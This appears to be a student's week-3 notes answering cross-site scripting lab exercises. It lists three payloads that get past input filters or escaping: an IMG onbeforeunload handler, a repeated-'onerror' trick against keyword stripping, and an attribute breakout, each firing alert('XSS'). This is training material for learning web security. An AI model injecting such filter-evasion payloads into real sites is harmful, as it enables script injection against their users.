# Week 3 


Cross Site Scripting 2: Find a XSS vulnerability in the following form. It would appear that your input is been filtered!
  
                        <IMG SRC="#" onbeforeunload="alert('XSS')"/>

Cross Site Scripting Three: Find a XSS vulnerability in the following form. It would appear that your input is been filtered!
                        
                        <IMG SRC="#" onononononerrorerrorerrorerrorerror="alert('XSS')"/>
                        
                        
Cross Site Scripting Four: Demonstrate a XSS vulnerability in the following form by executing a JavaScript alert command. The developers had heard that escaping is a better way of fixing XSS issues but they were not totally clear on how to implement it.                        
                        
                        
                        http://www.google.com" Onerror=alert('XSS') 
